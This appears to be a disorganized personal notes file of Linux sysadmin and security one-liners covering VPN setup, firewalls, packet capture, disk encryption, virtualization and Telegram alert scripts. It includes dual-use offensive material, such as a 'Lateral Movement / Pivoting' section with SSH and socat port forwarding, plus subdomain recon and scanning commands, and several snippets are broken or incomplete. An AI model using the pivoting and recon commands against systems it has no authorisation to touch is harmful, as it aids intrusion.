scp -i your_private_key file.txt remote_user@remote_host:



Mount the remote temp folder (as an example) to our mountpoint:

sshfs 192.168.0.1:/tmp /mnt/sshfs



Create local mountpoint in your home directory

mkdir /mnt/sshfs


Mount the remote temp folder (as an example) to our mountpoint:

sshfs 192.168.0.1:/tmp /mnt/sshfs


sshfs name@server:/path/to/folder /path/to/mount/point




Secure File Transfer Protocol or SFTP

sftp user@hostname.org






## --------------------------------------------- ##
##       [+] Load the tun driver: 
## --------------------------------------------- ##
modprobe tun


## ---------------------------------------------- ##
##       [+] Enable IP Forwarding.
## ---------------------------------------------- ##
echo 1 > /proc/sys/net/ipv4/ip_forward



## ------------------------------------------------------- ##
##     [+] generate a key for encryption
## ------------------------------------------------------- ##
openvpn --genkey --secret mykey.key



## ------------------------------------------- ##
##     [+] create a server.conf
## ------------------------------------------- ##
cat >server.conf << EOF
dev tun
ifconfig 10.0.0.1 10.0.0.2
secret mykey.key
EOF



## ---------------------------------------------------------------------- ##
##     [+] copy your encryption file to your client:
## ---------------------------------------------------------------------- ##
scp mykey.key root@earth:



netstat -putan | grep 1194


     create a client config file:

cat >client.conf << EOF
remote earth
dev tun
ifconfig 10.0.0.2 10.0.0.1
secret mykey.key
EOF




ifconfig tun0

ping -c 1 10.0.0.1

ping -c 1 10.0.0.2





"a" for "all," "v" for "verbose," and then "p" for "process" (show process #)

netstat -avp





/proc/PID/ns/net
from a namespaced process to 
/proc/$$/ns/net

ip netns add $NETNSNAME


ip netns exec $NETNSNAME /usr/bin/program


nsenter



ip netns exec $NETNSNAME /usr/bin/su -c /usr/bin/bash - $USERNAME




nsenter --net=/var/run/netns/$NETNSNAME -S $UID /usr/bin/bash




firejail --name="vpn-bastion" --hostname="vpn-bastion" --noprofile --netns="$NETNSNAME" -- /usr/bin/bash




started on my local network
snort -dev -h 192.68.0.1 -c /etc/snort.conf



 Running Snort Inline


modprobe ip_queue
 iptables -A OUTPUT -p tcp --dport 80 -j QUEUE>>


iptables -I OUTPUT 1 -p all -j QUEUE
iptables -I INPUT 1 -p all -j QUEUE
to route everything to the queue


I run snort this way for now:
/usr/local/bin/snort -Qdev -c /etc/snort/snort.conf

Reading from iptables
Running in IDS mode

Initializing Inline mode
 --== Initialization Complete ==--

   ,,_     -*> Snort! <*-
  o"  )~   Version 2.4.1 (Build 24)




 sudo iptables -I INPUT -s 1.2.3.4 -m time --datestop "$(date --date='+24 hours' --utc '+%FT%R')" -j DROP
-A INPUT -s 1.2.3.4/32 -m time --datestop 2021-06-20T16:11:00 -j DROP
sudo ipset create badips iphash maxelem 1000111222 timeout 0
sudo ipset add badips 1.2.3.4 timeout 86400
iptables -I INPUT -m set --match-set badips src -j DROP
service iptables save


block:
fail2ban-client set <JAIL NAME> banip <IP You want to block

unblock
fail2ban-client set <JAIL NAME> unbanip <IP you want to unblock.



# Example PCap a TCPDump wlan0 interface to external sdcard (e.g. DNS, 443 or ICMPv6)
adb shell tcpdump -ni wlan0 -U -w /sdcard/dump.pcap port 53 or port 443 or icmp6"

# Example PCap on data/local dir that captures a specific host
tcpdump -i br-lan -s0 -U -w /data/local/etherhost.pcap "ether host 34:xx:xx:xx:19:cb

# Example TCPDump that capture everything on ICMP6 
tcpdump -ni any -s0 -U -w /sdcard/icmp6.pcap icmp6


Sniff Network Traffic from / to IP

tcpdump -n -i eth0 src SRC_IP  or dst DEST_IP




function start_capture() {
    local pid=$HOME/logs/pcaps/current.pid
    if [ -f $pid ]; then
        if pgrep -F $pid; then
            echo "tcpdump is currently running for this user. Please stop it first."
            return
        fi
    fi
    [ ! -d $HOME/logs/pcaps ] && mkdir -p $HOME/logs/pcaps
    local dt=$(date '+%Y%m%d_%H%M%S.%N_%Z')
    /usr/bin/nohup tcpdump -i $1 -s0 -v -w $HOME/logs/pcaps/${dt}_capture_$1.pcap > /dev/null 2>&1 & echo $! > $pid
    echo "tcpdump started."
}

function stop_capture() {
    local pid=$HOME/logs/pcaps/current.pid
    if [ -f $pid ]; then
        if pgrep -F $pid; then
            kill -15 $(cat $pid)
            echo "tcpdump stopped."
            return
        fi
    else
        echo "tcpdump is not currently running."
    fi
}



[ ! -d $HOME/logs/screenshots ] && mkdir -p $HOME/logs/screenshots
[ ! -d $HOME/logs/terminals ] && mkdir -p $HOME/logs/terminals














ACK Scanning on Port 80

It is a good way to probe the existence of a firewall and its rule sets. 
If it finds a live host and an open port, 
it returns an RST response

hpin3 -A <target> -p 80

firewall and timestamp

hping3 -S 72.14.207.99 -p 80 --tcp-timestam








    Make a search of subdomains and print the info in the screen:

findomain -t example.com

    Make a search of subdomains and export the data to a output file (the output file name in it case is example.com.txt):

findomain -t example.com -o

    Make a search of subdomains and export the data to a custom output file name:

findomain -t example.com -u example.txt

    Make a search of only resolvable subdomains:

findomain -t example.com -r

    Make a search of only resolvable subdomains, exporting the data to a custom output file.

findomain -t example.com -r -u example.txt

    Search subdomains from a list of domains passed using a file (you need to put a domain in every line into the file):

findomain -f file_with_domains.txt

    Search subdomains from a list of domains passed using a file (you need to put a domain in every line into the file) and save all the resolved domains into a custom file name:

findomain -f file_with_domains.txt -r -u multiple_domains.txt

    Query the Findomain database created with Subdomains Monitoring.

findomain -t example.com --query-database

    Query the Findomain database created with Subdomains Monitoring and save results to a custom filename.

findomain -t example.com --query-database -u subdomains.txt

    Import subdomains from several files and work with them in the Subdomains Monitoring process:

findomain --import-subdomains file1.txt file2.txt file3.txt -m -t example.com



    Connect to remote computer/server and remote PostgreSQL server with specific username, password and database and push the data to Telegram webhook



$ findomain_telegrambot_token="Your_Bot_Token_Here" findomain_telegrambot_chat_id="Your_Chat_ID_Here" findomain -m -t example.com --postgres-user postgres --postgres-password psql  --postgres-host 192.168.122.130 --postgres-port 5432


https://github.com/Findomain/Findomain/blob/master/docs/docs/create_telegram_webhook.md





amass enum –list




amass viz -d3 domains.txt -o 443 /your/dir/




amass intel -ip -src -cidr 104.154.0.0/15




amass intel -org uber


amass enum -ip -d danielmiessler.com



amass viz -d3 domains.txt -o 443 /your/dir/



find new domains is to look by ASN.
amass intel -asn 63086




Finding Subdomains
amass enum -d -ip -src danielmiessler.com




Find your network drivers one-liner

ls -1 /sys/class/net/ | grep -v lo | xargs -n1 -I{} bash -c 'echo -n {} :" " ; basename `readlink -f /sys/class/net/{}/device/driver`'






Generate a SSH key

ssh-keygen -t rsa -b 4096

You will want to put the contents of id_rsa.pub in /etc/ssh/authorized_keys 



RSAAuthentication yes
PubkeyAuthentication yes
AuthorizedKeysFile  /etc/ssh/authorized_keys
PasswordAuthentication no
PermitEmptyPasswords no
AllowTcpForwarding no
X11Forwarding no




https://wiki.alpinelinux.org/wiki/Bridge





SCP

# Copy a file:
scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext

# Copy a directory:
scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination




ssh user@127.0.0.1
ssh -i /path/to/id_rsa user@127.0.0.1



Lateral Movement / Pivoting

SSH Local Port Forward

ssh <user>@<target> -L 127.0.0.1:8888:<targetip>:<targetport>

SSH Dynamic Port Forward

ssh -D <localport> user@host
nano /etc/proxychains.conf
127.0.0.1 <localport>

Socat Port Forward

./socat tcp-listen:5000,reuseaddr,fork tcp:<target ip>:5001




capture-wifi.sh
https://github.com/carnal0wnage/random-scripts/blob/master/wifi/capture-wifi.sh
#!/bin/bash
sudo iw dev wlan0 interface add wmon0 type monitor
sudo ifconfig wmon0 up
sudo dumpcap -i wmon0 -w /tmp/wlan0.pcap






cat access.log | grep 404 | awk '{print $1}' | sort | uniq -c
cat access.log | grep 10.1.1.1 | grep -v "404"|grep “200” | awk '{print $7}'
cat secure | grep Failed | awk '{print $ 11}' | uniq -c
find . -type f | xargs grep -e "eval|assert"








modprobe cls_cgroup
mkdir /sys/fs/cgroup/net_cls
mount -t cgroup -onet_cls net_cls /sys/fs/cgroup/net_cls
mkdir /sys/fs/cgroup/net_cls/foobar







EmergingThreats-Compromised-IPs.txt

emerging-IPTABLES-DSHIELD.rules


EmergingThreats-[IPTables-DShield].rules
https://rules.emergingthreats.net/fwrules/emerging-IPTABLES-DSHIELD.rules


EmergingThreats-[Block-IPs].txt
https://rules.emergingthreats.net/fwrules/emerging-Block-IPs.txt

EmergingThreats-[IPTables-ALL].rules
https://rules.emergingthreats.net/fwrules/emerging-IPTABLES-ALL.rules




EmergingThreats-[IPTables-CC].rules
EmergingThreats-[Block-C&C-Servers]-Identified-By-Abuse.ch
EmergingThreats-[Block-C&C-Servers]-Identified-By-[Abuse.ch].rules
-----------------------------------------------------------------------------<|>
https://rules.emergingthreats.net/fwrules/emerging-IPTABLES-CC.rules
-----------------------------------------------------------------------------<|>


-----------------------------------------------------------------------------<|>
EmergingThreats-[IPTables-DROP].rules
EmergingThreats-[Spamhaus-DROP]-rules
-----------------------------------------------------------------------
https://rules.emergingthreats.net/fwrules/emerging-IPTABLES-DROP.rules
-----------------------------------------------------------------------


-----------------------------------------------------------------------------<|>
EmergingThreats-[IPTables-DShield].rules
-----------------------------------------------------------------------
https://rules.emergingthreats.net/fwrules/emerging-IPTABLES-DSHIELD.rules
-----------------------------------------------------------------------



How-To-Secure-A-Linux-Server-[linux-kernel-sysctl-hardening.md-[How-To-Secure-A-Linux-Server].txt



How-To-Secure-A-Linux-Server-[linux-kernel-sysctl-hardening].md

-----------------------------------------------------------------------------------------------------------------------<|>
https://github.com/imthenachoman/How-To-Secure-A-Linux-Server
https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/blob/master/README.md
https://raw.githubusercontent.com/imthenachoman/How-To-Secure-A-Linux-Server/master/linux-kernel-sysctl-hardening.md
https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/blob/master/linux-kernel-sysctl-hardening.md
-----------------------------------------------------------------------------------------------------------------------<|>
How-To-Secure-A-Linux-Server/master/linux-kernel-sysctl-hardening.md
How-To-[Secure-A-Linux-Server]+Linux-Kernel-[Sysctl-Hardening]-README.md
https://raw.githubusercontent.com/imthenachoman/How-To-Secure-A-Linux-Server/master/README.md
-----------------------------------------------------------------------------------------------------------------------<|>

How-To-Secure-A-Linux-Server/master/linux-kernel-sysctl-hardening.md



iw dev 
iw dev wlan0 link
iw dev wlan0 station dump

iw list
iw dev wlan0 scan

iw event
iw event -f
iw event -t



ip a
ip link show
ip r

lshw -class network


# Shows all devices the the device use
ls /sys/class/net/

cat /proc/net/dev

# Shows route 
cat /proc/net/route

nmcli device status
nmcli connection show
ethtool eth0

ps aux | egrep "sshd: [a-zA-Z]+@"



sudo fuser -k 80/tcp                                            # kill all processes using port 80 (useful if nginx won't stop/restart gracefully)



# Shows current netstat stats, sorts them and print the ID
netstat -an | awk '{print $6}' | sort | uniq -c | sort -rn


netstat -ntlp | grep LISTEN


Check which ports are used
netstat -tulpn



netstat -tapen | grep ":8000"



ESTABLISHED / TIME_WAIT / FIN_WAIT1 / FIN_WAIT2 
netstat -n | awk '/^tcp/ {++tt[$NF]} END {for (a in tt) print a, tt[a]}'




mtr 


scp user@host:path dest


# Show all processes that use a port
lsof -i 4tcp

netstat -anvp tcp | awk 'NR<3 || /LISTEN/'

lsof -i4TCP:80 -n -P | grep LISTEN



lsof -i port:80


lsof -n -i:3001 | grep LISTEN


kill it:
kill `lsof -n -i:3001 | grep LISTEN | tail -n1 | awk '{print $2}'`



lsof -P -i -n | cut -f 1 -d " "| uniq | tail -n +2


ps aux | sort -nk +4 | tail



Bringing up an interface using wg-tools:
The most straightforward method, 
and the one recommended in WireGuard documentation,
is to use wg-quick.

## ----------------------------------------------------------------------- ##
##      [?] Then load the Wireguard Kernel module:
## ----------------------------------------------------------------------- ##
modprobe --verbose wireguard


## ------------------------------------------------------------------------------------------- ##
##      [?] Add it to /etc/modules to automatically load it on boot.
## ------------------------------------------------------------------------------------------- ##
##      [?] Then we need to create a private and public key
## ------------------------------------------------------------------------------------------- ##
wg genkey | tee privatekey | wg pubkey > publickey


## ------------------------------------------------------------------------------------------- ##
##      [?] Then we create a new config file /etc/wireguard/wg0.conf 
## ------------------------------------------------------------------------------------------- ##


## ------------------------------------------------ ##
##      [?] Grep for a specific port:
## ------------------------------------------------ ##
netstat -tulpn | grep :80


## ----------------------------- ##
##      [?] Get PIDs:
## ----------------------------- ##
ps -aux | grep name

netstat -tulpn | grep :80
ps aux | grep "[n]ginx"


# ssh
ssh-keygen -t rsa										# generate ssh keys
find ~/.ssh -type f -exec chmod -R 600 {} \; && find ~/.ssh -type d -exec chmod -R 700 {} \;	# fix permissions on ssh folder and keys


# rsync
rsync -havz --stats --progress -e "ssh -i /path/to/sshkey.pem" /path/to/local/file user@remotehost:~/   # transfer local file to home directory on remote server
rsync -havz --stats --progress -e "ssh -i /path/to/sshkey.pem" user@remotehost:~/file ~/                # transfer file from home directory on remote server to local home directory






timedatectl set-ntp true

ss  --no-header --options state established '( sport = :ssh )'


dig -x "$( hostname -i )" +noall +answer | awk '/\.$/ { print substr($NF, 1, length($NF)-1) }'









shred --zero 



UUID=$( blkid --match-tag 'UUID' --output 'value' "${home}1" )

UUID=$(  blkid --match-tag 'UUID' --output 'value' '/dev/md/boot_mirror' )

UUID=$(  blkid --match-tag 'UUID' --output 'value' '/dev/md/root_mirror')





cryptsetup  luksAddKey  --key-file  '/etc/luks.key' '/dev/md/boot_mirror'

cryptsetup  luksAddKey  --key-file  '/etc/luks.key' '/dev/md/root_mirror'

cryptsetup  luksAddKey  --key-file  '/etc/luks.key' "${home}1"









cryptsetup  open  --type 'plain' --key-file  '/dev/random'  "${dev}" 'container'









## -------------------------------------------------- ##
##      [?] Create an encrypted disk
## -------------------------------------------------- ##
qemu-img create -e -f qcow2 image.qcow2 10G






virtview

virt-viewer --connect qemu+ssh://$1/system "$2"




## ----------------------------------------------------- ##
##      [?] Encrypt and open container

echo -n $PASSWORD | sudo cryptsetup --hash $HASH --cipher $CIPHER-xts-plain64 --key-size $BITS --key-file "-" luksFormat $CONTAINER_DIR/$1
echo -n $PASSWORD | sudo cryptsetup --key-file "-" luksOpen $CONTAINER_DIR/$1 $1

# Make the filesystem
mkfs.ext4 -L $1 /dev/mapper/$1
tune2fs -m 0 /dev/mapper/$1

mountContainer $1

# Fix permissions on the mounted container
sudo chown $WHOAMI $MOUNT_DIR/$1
chmod 700 $MOUNT_DIR/$1


mount | awk '{print $3}' | grep -w "$MOUNT_DIR/$1"

umount $MOUNT_DIR/$1
rmdir $MOUNT_DIR/$1
cryptsetup luksClose $1





    printf "%s" "${mountphrase}" | ecryptfs-add-passphrase > /tmp/tmp.txt
    sig=`tail -1 /tmp/tmp.txt | awk '{print $6}' | sed 's/\[//g' | sed 's/\]//g'`
    rm -f /tmp/tmp.txt
    mount -t ecryptfs -o key=passphrase:passphrase_passwd=${mountphrase},no_sig_cache=yes,verbose=no,ecryptfs_fnek_sig=${sig},ecryptfs_sig=${sig},ecryptfs_cipher=aes,ecryptfs_key_bytes=16,ecryptfs_passthrough=no,ecryptfs_enable_filename_crypto=yes $TOOLSDIR $TOOLSDIR
    unset mountphrase

    printf "%s" "${mountphrase}" | ecryptfs-add-passphrase > /tmp/tmp.txt
    sig=`tail -1 /tmp/tmp.txt | awk '{print $6}' | sed 's/\[//g' | sed 's/\]//g'`
    rm -f /tmp/tmp.txt
    mount -t ecryptfs -o key=passphrase:passphrase_passwd=${mountphrase},no_sig_cache=yes,verbose=no,ecryptfs_fnek_sig=${sig},ecryptfs_sig=${sig},ecryptfs_cipher=aes,ecryptfs_key_bytes=16,ecryptfs_passthrough=no,ecryptfs_enable_filename_crypto=yes $DATADIR $DATADIR
    unset mountphrase
    if [ -d "/data/admin" ]; then
        ls /data
    else
        mkdir /data/admin /data/osint /data/recon /data/targets /data/screeshots /data/payloads /data/logs
    fi

















List vms:
#
#     vboxmanage list vms
#
# Delete a vm:
#
#     vboxmanage unregistervm <uuid> --delete
#
# Remove a vm that is inaccessible:
#
#     vboxmanage unregistervm <uuid>
#
# List drives:
#
#     vboxmanage list hdds
#
# Delete a drive:
#
#     vboxmanage closemedium <uuid> --delete
#
#
# ## Formats for disks
#
# We typically use these formats:
#
#   * VMDK: VMWare uses VMDK as the default disk image format.
#     Multipe VMDK versions and variations exist, so it’s important
#     to understand which one you’re using and where it can be used.
#
#   * VDI: VirtualBox uses VDI as the default disk image format.
#     VDI is not compatible with VMWare




[sixarm_virtualbox_scripts]-vboxmanage-clone-from-vmdk-to-vdi-then-resize 

https://github.com/SixArm/sixarm_virtualbox_scripts/blob/dc7efa974e294a54eaea50d21009b2b73866dc32/vboxmanage-clone-from-vmdk-to-vdi-then-resize

https://github.com/SixArm/sixarm_virtualbox_scripts/blob/main/vboxmanage-createvm-ubuntu

https://github.com/SixArm/sixarm_virtualbox_scripts/blob/main/vboxmanage-clone-from-vmdk-to-vdi-then-resize
https://raw.githubusercontent.com/SixArm/sixarm_virtualbox_scripts/main/vboxmanage-clone-from-vmdk-to-vdi-then-resize


sixarm_virtualbox_scripts-[vboxmanage-createvm-ubuntu].sh
sixarm_virtualbox_scripts-[vboxmanage-createvm-ubuntu].sh

https://raw.githubusercontent.com/SixArm/sixarm_virtualbox_scripts/main/vboxmanage-createvm-ubuntu




vboxmanage-createvm
https://raw.githubusercontent.com/SixArm/vboxmanage-createvm/main/vboxmanage-createvm




VBoxManage clonehd "$src" "$dst" –format vdi
VBoxManage modifyhd "$dst" --resize "$megabytes"




wget --show-progress -4 -P /home/parrotseckiosk/Downloads/[05-11-20]/Xe1phix-[Darknet]/Darknet-[I2P]/[I2P]-Specification-Documents/ -nd -r -l 1 -H -D geti2p.net -A txt https://geti2p.net/spec




wget --show-progress -4 -P ~/Downloads/PDFs/Archive.org/LinuxBooks/ -nd -r -l 1 -H -D archive.org -A pdf https://archive.org/download/linux-books


wget --show-progress -4 -P ~/Downloads/PDFs/Archive.org/Linux-Collection-PDF-EBooks-All-You-Need/ -nd -r -l 1 -H -D archive.org -A pdf https://archive.org/download/linux-collection-pdf-ebooks-all-you-need



wget -O - downforeveryoneorjustme.com/$1 -q | grep "a href=.*$1" | sed 's/<.*>/'"$1"'/g'





pdf-redact-tools --sanitize Apress.Linux.System.Administration.Recipes.A.Problem.Solution.Approach.Oct.2009.ISBN.1430224495.pdf









ssh -n -N -f -L 3307:localhost:3306 user@fullhost
crontab: min, hr, dayofmonth, monthofyear, dayofweek, [year]

smb://fs1/clients/ # mount a windows share
scp localfile user@host:/path/to/remotefile # scp local -> remote
scp user@host:/path/to/remotefile localfile # scp remote -> local

rpm -e --nodeps packagename # remove a pkg wo messing with dependencies.
rpm -ql #list files for rpm
rpm -qa #list all packages (yum list)

tcpdump -vv -x -X -i eth0 'port 80' -w tcptraffic_port80.txt
nmap -sT -O localhost # check'n me ports arrrgh.
netstat -anp | grep 8080 # port info
scapy # network magic 
scapy >>> arping("192.168.0.*") # goodbye nmap






# kill multiple processes using keyword
kill -9 `ps -ef | grep keyword | grep -v grep | awk '{print $2}'`

# check sockets
netstat --unix -l

# check open ports
netstat -tulpn

# check how many processors you have
grep processor /proc/cpuinfo | wc -l




# set user/group IDs
RUN groupadd -r "$TG_USER" --gid=999 && useradd -r -g "$TG_USER" --uid=999 "$TG_USER"



--verbosity -u $User -k $PubKey 

--phone 5153059213 --rsa-key $PubKey --tcp-port 443 --udp-socket TelegramSocket

--phone 5153059213 --rsa-key /etc/telegram-cli/server.pub --tcp-port 443 --udp-socket TelegramSocket --disable-link-preview --sync-from-start


telegram-cli -k /home/pi/tg/tg-server.pub -W -e \"add_contact $1 $2 $3\"

telegram-cli -k /home/pi/tg/tg-server.pub -W -e "msg $1 $2"
echo "msg $1 "$2"" | nc localhost 54621

echo "send_photo "$1 $2"" | nc localhost 54621




telegram-cli -k /home/pi/tg/tg-server.pub -W -e "msg $1 $2"
# 1 = empf
# 2 = latitude
# 3 = longitutde
echo "send_location $1 $2 $3" | nc localhost 54621


echo ------------------------------------------------------------------------------------------------
echo To get monitoring alerts, person should /start your monitoring bot in telegram.
echo Then you enable alerts for person by adding telegram chat_id from list below to recipients file.
echo You specify recipients file in parameter MSMS_RECIPIENTS of .ini file for your service.
echo ------------------------------------------------------------------------------------------------
curl -s https://api.telegram.org/bot$(cat telegram-api-key.txt)/getUpdates



#################################################################
# send message to telegram
# parameter: message text
# recipients chat id list should be in "recipients.txt" file
#################################################################
function send_message {
    for chat_id  in $(cat $MSMS_RECIPIENTS); do
	curl -s -X POST --connect-timeout 10 $TG_API_URL -d chat_id=$chat_id -d parse_mode="Markdown" -d text="$1"  # > /dev/null
	echo
    done
}



curl -s -X POST -H "Content-Type: application/json" --connect-timeout 3 -m 7 -d @request.json



curl -s -d "chat_id=$CHAT_ID&disable_web_page_preview=1&text=$1" $URL




STATUS=$(ip route show match 0/0)

if [ ! -z "$STATUS" ]; then

    read GATEWAYIP IFACE LOCALIP <<< $(echo $STATUS | awk '{print $3" "$5" "$7}')
    GATEWAYMAC=$(ip neigh | grep "$GATEWAYIP " | awk '{print $5}')

    echo "INTERFACE:   $IFACE"
    echo "GATEWAY IP:  $GATEWAYIP"
    echo "GATEWAY MAC: $GATEWAYMAC"
    echo "LOCAL IP:    $LOCALIP"

    if [ -z $(curl -fsS http://google.com > /dev/null) ]; then
        PUBLICIP=$(dig +short myip.opendns.com @resolver1.opendns.com)

        echo "PUBLIC IP:   $PUBLICIP"
fi




CLIENT_IP=$(echo $SSH_CLIENT | awk '{print $1}')


SRV_HOSTNAME=$(hostname -f)
	SRV_IP=$(hostname -I | awk '{print $1}')

	IPINFO="https://ipinfo.io/${CLIENT_IP}"

	TEXT="Connection from *${CLIENT_IP}* as ${USER} on *${SRV_HOSTNAME}* (*${SRV_IP}*)
	Date: ${DATE}
	More informations: [${IPINFO}](${IPINFO})"

	curl -s -d "chat_id=$i&text=${TEXT}&disable_web_page_preview=true&parse_mode=markdown" $URL > /dev/null
fi
done






USER=$(whoami)
sudo chown -R $USER ./


USER=$(id -un)
UID=$(id -u)

# Check for root
if [ "$(id -u)" != 0 ]; then echo "Re-run as root.  Exiting..."; exit; fi



export HOMELAB_IP=$(hostname -I | awk '{print $1}'
homelab_ssh_user: $(whoami)



set -o posix

`PID=$!      # record pid of background find`




/lib/live/mount/overlay/root/
if [ ! -d /lib/live/mount/overlay/root ]
then
    ls -d -1 /lib/live/mount/rootfs/* |sort -u
    sleep 5
    exit
fi




find . -mount \( -regex '.*/\.wh\.[^/]*' -type f \) | sed -e 's/\.\///;s/\.wh\.//' |

while read N
do

done



find . -mount -type d | busybox tail +2 | sed -e 's/\.\///' | grep -v -E '^mnt|^initrd|^proc|^sys|^tmp|^root/tmp|^\.wh\.|/\.wh\.|^dev/|^run|^var/run/udev|^run/udev|^var/tmp|^etc/blkid-cache' |
find . -mount -type d | busybox tail +2 | sed -e 's/\.\///' | grep -v -E '^mnt|^initrd|^proc|^sys|^tmp|^root/tmp|^\.wh\.|/\.wh\.|^dev/\.|^dev/fd|^dev/pts|^dev/shm|^dev/snd|^var/tmp' |




while read N
do
    mkdir -p $Dir/$Dir/    
    chmod --reference="$1"
    OWNER=stat --format=%U "$1"
    chown $OWNER $Dir/$1
    GRP="stat --format=%G "$1"
    chgrp $Group $Dir/$1
    touch $Dir/$1 --reference="$1"
done





VBoxManage clonemedium <in_file.vdi> <out_file.img> --format RAW


The qcows can be generated by logging onto the Xen Servers and running the command qemu-img create -f qcow2 -o compat=0.10,backing_file=<<Location of the Image File>> <<Location of the qcow file>>





mount -o remount,rw 
umount /lib/live/mount/overlay

fusermount -u /media/android


umount /mnt
qemu-nbd -d /dev/nbd0p$p


# Check if something is mounted on /mnt, and if so, exit so you can take care of it.
if [[ $(mount | grep /mnt) ]]; then
	mount | grep /mnt
	echo "You've already got something mounted there, pal.  Do something about that first."
	exit 0
fi



# Perform a quick device and modual cleanse
if [[ $(fdisk -l 2>&1 | grep nbd) ]]; then
	qemu-nbd -d /dev/nbd0
	sleep 1s
	fi
if [[ $(lsmod | grep nbd) ]]; then
	rmmod nbd
	sleep 1s
	fi

# Load kernel module and initialize device nbd
echo "Establishing device..."
modprobe nbd max_part=16
sleep 1s
qemu-nbd -c /dev/nbd0 "$1"
# Sleep for 2 seconds.  If it tries to immediately mount the nbd device,
# mount will complain that it doesnt exist and, consequently, will not mount.
sleep 2s
# Set up the device on /mnt
# Obviously, this should probably be adjusted in the future
mount /dev/nbd0p$p /mnt






Create an encrypted disk


At the first prompt hit enter (as the password is blank), 
at the second prompt you will set the password for your resulting encrypted disk.

qemu-img create -e -f qcow2 image.qcow2 10G





Create and unencrypted image.qcow, then convert an encrypted.qcow 



Create an unencrypted image.qcow


qemu-img create -f qcow2 image.qcow2 10G



Now convert the qcow2 file into an encrypted image (encrypted.qcow) 

qemu-img convert -e -O qcow2 image.qcow2 encrypted.qcow2







Determine if you qcow image is encrypted

View the details of your images with qemu-img info




qemu-img info encrypted.qcow2

##  image: encrypted.qcow2 <-- Note encryption
##  file format: qcow2
##  virtual size: 10G (10737418240 bytes)
##  disk size: 136K
##  encrypted: yes <-- Note encryption
##  cluster_size: 65536
## -------------------------------------------------- ##





dd status=progress if=$1 of=$2 $3
notify-send "Your dd command FINALLY fucking finished."


mount "$1" /mnt

echo "binding pric, sys, dev, and dev/pts to /mnt..."
mount -o bind /proc /mnt/proc
mount -o bind /sys /mnt/sys
mount -o bind /dev /mnt/dev
mount -o bind /dev/pts /mnt/dev/pts
echo "Entering chroot with /bin/bash...enjoy!"
chroot /mnt /bin/sh







for ac_var in `(set) 2>&1 | sed -n '\''s/^\([a-zA-Z_][a-zA-Z0-9_]*\)=.*/\1/p'\''`; do

`while [ "$(ps a | awk '{print }' | grep $pid)" ]; do`


`LABEL=`cat /proc/cmdline | grep persistence-label``
`if [ -z "$LABEL" ]; then`
    `LABEL="persistence"`
`else`
    `LABEL=`cat /proc/cmdline | awk 'BEGIN{FS="persistence-label="} {print }' | awk 'BEGIN{FS=" "} {print }'``
`fi`
`BASE=`mount -l | grep "\[$LABEL\]" | grep -m 1 /lib/live/mount/persistence | awk 'BEGIN{FS=" "} {print }'``
`if [ -z "$BASE" ]; then`

    `sleep 4`
    `exit`
`fi`





`dialog --backtitle "Are you sure you want to flush all changes to disk?" --yesno " Save " 5 20`
`if test $? -ne 0`
`then`
   `exit`
`fi`
`clear`






grep -E -v -e '\s+(network|broadcast)' /etc/network/interfaces





/home/user/.config/autostart/LXRandR*


Step1: On the Xen machine create a new disk of size 30GB using command
"qemu-img create -f qcow2 -o compat=0.10 DataDisk1.qcow 30G"

Step2: Add new disk to the configuration file
Example : "disk = [ 'tap:qcow2:/mnt/vlab-local/vital/vm_dsk/Computer_Networks.qcow,xvda,w', 'tap:qcow2:/mnt/vlab-local/vital/vm_dsk/DataDisk1.qcow,xvdb,w' ]"




virsh dumpxml vm01 | xmllint --xpath '//*/hostdev' -



boot=live config rw rw-basemount

persistence persistence-read-only persistence-label=persistence

showmounts live-media-path=/live/



[Freedom.of.Press]-GPGkey.asc
https://raw.githubusercontent.com/freedomofpress/securedrop/develop/admin/tests/files/key.asc


SecureDrop.asc
https://raw.githubusercontent.com/freedomofpress/securedrop/develop/admin/tests/files/SecureDrop.asc





https://raw.githubusercontent.com/freedomofpress/securedrop/develop/admin/tests/files/ossec.pub





smtp_relay: smtp.gmail.com
smtp_relay_port: 587

ossec_alert_email: la@foo.com
ossec_alert_gpg_public_key: key.asc
ossec_gpg_fpr: E99FFE83DF73E72FB6B264ED992D23B392F9E4F2
sasl_domain: gnu.com
sasl_password: passowrdok
sasl_username: usernameok





sed(1) may edit a file in-place with -i flag. 
The -i flag accepts a parameter that is a backup suffix 
so you dont lose old files content.

sed -i bak 's/foo/bar/g'






$(echo -n -e $privMsg | cut -f1 -d' ' | tr '[:upper:]' '[:lower:]')



echo $lineA | cut -f1 -d' '
echo $lineA | cut -f2 -d' '
echo ${line:1} | cut -f1 -d'!'
echo -n -e $privMsg | cut -f1 -d' ' | tr '[:upper:]' '[:lower:]'





Make sure your authentication service is running:

/etc/init.d/saslauthd status 


In /etc/postfix/main.cf, set

smtp_sasl_auth_enable = yes
smtpd_sasl_auth_enable = yes


Restart Postfix

/etc/init.d/postfix restart




virsh dumpxml vm01 | xmllint --xpath '//*/hostdev' -

wire

    transform your harddisk image to a vmware image:

qemu-img /mnt/usb/hdimage.img -O vmdk /hdimage.vmdk




Qemu will then use qemudisk.img as its hard drive, use only 512 MB of your RAM, and take your CD drive as its own. It will boot the installation CD of your Linux distribution and install it into the virtual disk qemudisk.img. 


qemu -cdrom /dev/cdrom -hda qemudisk.img -boot d -m512




How to boot the live CD :

qemu -m 512 -kernel-kqemu -cdrom /usr/src/Oralux_0.7_alpha.iso -boot d -soundhw es1370 &


Networking

By default, libvirt uses NAT for VM connectivity. If you want to use the default configuration, you need to load the tun module.

# modprobe tun













If you prefer bridging a guest over your Ethernet interface, you need to make a bridge.

It's quite common to use bridges with KVM environments. 
But when IPv6 is used, Alpine will assign itself a link-local address as well as an SLAAC address 
in case there's a router sending Router Advertisements. 
You don't want this because you don't want to have the KVM 
host an IP address in every network it serves to guests. 
Unfortunately IPv6 can not just be disabled for the bridge 
via a sysctl configuration file, because the bridge might not be up 
when the sysctl config is applied during boot. What works is to
 put a post-up hook into the /etc/network/interfaces file like this: 

auto brlan
iface brlan inet manual
       bridge-ports eth1.5
       bridge-stp 0
       post-up ip -6 a flush dev brlan; sysctl -w net.ipv6.conf.brlan.disable_ipv6=1

Management

For (non-root) management, you will need to add your user to the libvirt group.

# addgroup user libvirt

You can use libvirt's virsh on the CLI. It can execute commands as well as run as an interactive shell. Read its manual page and/or use the "help" command for more info. Some basic commands are:

virsh help
virsh list --all
virsh start $domain
virsh shutdown $domain

